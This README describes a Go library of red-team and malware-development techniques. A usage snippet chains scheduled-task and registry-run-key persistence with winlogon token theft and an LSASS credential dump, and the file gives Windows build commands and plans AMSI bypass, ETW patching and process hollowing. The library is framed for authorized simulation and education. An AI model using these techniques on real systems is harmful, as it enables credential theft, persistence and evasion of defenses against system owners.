# golangexamples — Red Team Technique Library (Go)

A modular, composable Go library of offensive techniques for red team simulation and maldev study.  Each technique lives in a typed struct, implements a common interface, and can be wired into the `pkg/sim` orchestrator to build multi-stage simulations in a few lines.

## Repository layout

```
golangexamples/
├── pkg/
│   ├── sim/           # Technique interface + Sim orchestrator
│   ├── persistence/   # T1547.001, T1053.005, T1543.003, T1546.015
│   ├── tokens/        # T1134.001  token impersonation / privilege escalation
│   └── creds/         # T1003.001  LSASS dump
├── cmd/
│   └── sim/           # composed multi-stage demo (build this to run a sim)
└── examples/          # original standalone PoCs preserved as reference
    ├── basic/         # local shellcode runner
    ├── remote/        # CreateRemoteThread injection
    ├── api/           # API hashing (CRC32) + remote injection
    ├── ipv4/          # IPv4 shellcode obfuscation
    ├── webinjection/  # remote payload staging over HTTP
    ├── persistence-{registry,schtask,startup,service,com}/
    └── token-impersonation/
```

## The Technique interface

Every primitive in `pkg/` implements:

```go
type Technique interface {
    Name()  string   // e.g. "registry-run-key"
    MITRE() string   // e.g. "T1547.001"
    Run()   error
}
```

Techniques that can revert their changes also implement `Cleaner`:

```go
type Cleaner interface {
    Cleanup() error
}
```

## Building a simulation

```go
s := sim.New().
    Add(&persistence.SchTask{
        PayloadPath: `C:\Tools\payload.exe`,
        UseXML:      true,
    }).
    Add(&persistence.RegistryRunKey{
        Hive:        persistence.HKCU,
        PayloadPath: `C:\Tools\payload.exe`,
    }).
    Add(&tokens.Steal{
        TargetExe:     "winlogon.exe",
        SpawnExe:      `C:\Windows\System32\cmd.exe`,
        EnableSeDebug: true,
    }).
    Add(&creds.LSASSDump{
        OutputPath:    `C:\Tools\lsass.dmp`,
        EnableSeDebug: true,
    })

// Dry run — print the plan without executing
for _, p := range s.Plan() { fmt.Println(p) }

// Execute
if err := s.Run(); err != nil { log.Fatal(err) }

// Revert persistence (LIFO order)
s.Cleanup()
```

## Build

```sh
# Library packages
GOOS=windows GOARCH=amd64 go build ./pkg/...

# Composed sim binary
GOOS=windows GOARCH=amd64 go build -o sim.exe ./cmd/sim

# Stripped binary
GOOS=windows GOARCH=amd64 go build -ldflags "-s -w" -o sim.exe ./cmd/sim

# Individual standalone PoC
GOOS=windows GOARCH=amd64 go build -o persist-schtask.exe ./examples/persistence-schtask
```

## Technique coverage

| Package | Struct | MITRE | Admin? |
|---|---|---|---|
| persistence | `RegistryRunKey` | T1547.001 | No (HKCU) / Yes (HKLM) |
| persistence | `SchTask` | T1053.005 | No |
| persistence | `StartupFolder` | T1547.001 | No |
| persistence | `Service` | T1543.003 | Yes |
| persistence | `COMHijack` | T1546.015 | No |
| tokens | `Steal` | T1134.001 | Yes (admin → SYSTEM) |
| creds | `LSASSDump` | T1003.001 | Yes + SeDebug |

## What's next

Planned additions (Phase 2+):

- `pkg/evasion/` — AMSI bypass, ETW patching, module unhooking, direct syscalls
- `pkg/injection/` — process hollowing, APC injection, thread hijacking
- `pkg/crypto/` — XOR/AES/RC4 wrappers for payload staging
- `pkg/obfuscation/` — API hashing, string obfuscation, UUID/MAC encoding
- `pkg/recon/` — process/service/user enumeration helpers

> All techniques are proof-of-concept for authorized red team simulation and maldev education only.
